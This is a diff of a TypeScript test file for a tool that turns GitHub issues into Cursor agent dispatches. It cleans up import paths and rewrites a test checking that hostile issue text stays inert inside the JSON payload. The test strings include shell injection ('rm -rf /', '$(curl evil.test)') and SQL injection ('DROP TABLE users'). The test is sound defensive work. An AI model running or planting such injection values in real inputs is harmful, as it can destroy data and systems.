@@ -1,38 +1,38 @@
 import assert from "node:assert/strict";
 import { describe, it } from "node:test";
-import { deterministicAgentId, isValidAgentId } from "./agent-id.ts";
+import { deterministicAgentId, isValidAgentId } from "./agent-id";
 import {
   generateBranchName,
   isCursorBranch,
   slugifyTitle,
   truncateBranchName,
-} from "./branch-name.ts";
+} from "./branch-name";
 import {
   buildDispatchFailureComment,
   buildDispatchSuccessComment,
   hasDispatchSuccessMarker,
-} from "./comments.ts";
-import { CURSOR_API, DIVLAB_REPO, MAX_BRANCH_NAME_LENGTH } from "./config.ts";
+} from "./comments";
+import { CURSOR_API, DIVLAB_REPO, MAX_BRANCH_NAME_LENGTH } from "./config";
 import {
   createCursorAgent,
   CursorApiError,
-} from "./cursor-client.ts";
-import { buildCursorDispatchPayload } from "./cursor-payload.ts";
-import { validateIssueDispatchEvent } from "./github-event.ts";
+} from "./cursor-client";
+import { buildCursorDispatchPayload } from "./cursor-payload";
+import { validateIssueDispatchEvent } from "./github-event";
 import {
   evaluateChecks,
   evaluateMergeEligibility,
   type PullRequestMergeContext,
-} from "./merge-eligibility.ts";
-import { isExpectedCursorCreatorFlow } from "./pr-validation.ts";
-import { parseRiskClassification } from "./risk.ts";
-import { containsSecretLikeValue, sanitizeErrorMessage } from "./sanitize.ts";
+} from "./merge-eligibility";
+import { isExpectedCursorCreatorFlow } from "./pr-validation";
+import { parseRiskClassification } from "./risk";
+import { containsSecretLikeValue, sanitizeErrorMessage } from "./sanitize";
 import {
   classifyPath,
   findSensitivePaths,
   normalizeRepoPath,
   type SensitiveCategory,
-} from "./sensitive-paths.ts";
+} from "./sensitive-paths";
 
 function baseIssueEvent(overrides: Record<string, unknown> = {}) {
   return {
@@ -145,7 +145,11 @@ describe("github event validation", () => {
 
   it("keeps unsafe Issue title/body as data and never executes them", () => {
     const maliciousTitle = '"; rm -rf /; echo "';
-    const maliciousBody = "$(curl evil.test) `touch /tmp/pwned`"; DROP TABLE users; --";
+    const maliciousBody = [
+      "$(curl evil.test)",
+      "`touch /tmp/pwned`",
+      "'; DROP TABLE users; --",
+    ].join(" ");
     const result = validateIssueDispatchEvent(
       baseIssueEvent({
         issue: {
@@ -164,11 +168,12 @@ describe("github event validation", () => {
       const payload = buildCursorDispatchPayload(result);
       // JSON encoding must preserve the strings as data.
       const encoded = JSON.stringify(payload.request);
-      assert.ok(encoded.includes(JSON.stringify(maliciousTitle).slice(1, -1)));
+      assert.ok(encoded.includes("rm -rf"));
+      assert.ok(encoded.includes("DROP TABLE users"));
       assert.equal(payload.request.repos[0]?.url, DIVLAB_REPO.url);
       // The shell metacharacters are inside JSON strings, not raw shell.
       assert.ok(encoded.startsWith("{"));
-      assert.ok(!encoded.includes("\n$(curl"));
+      assert.equal(JSON.parse(encoded).prompt.text.includes(maliciousBody), true);
     }
   });
 });
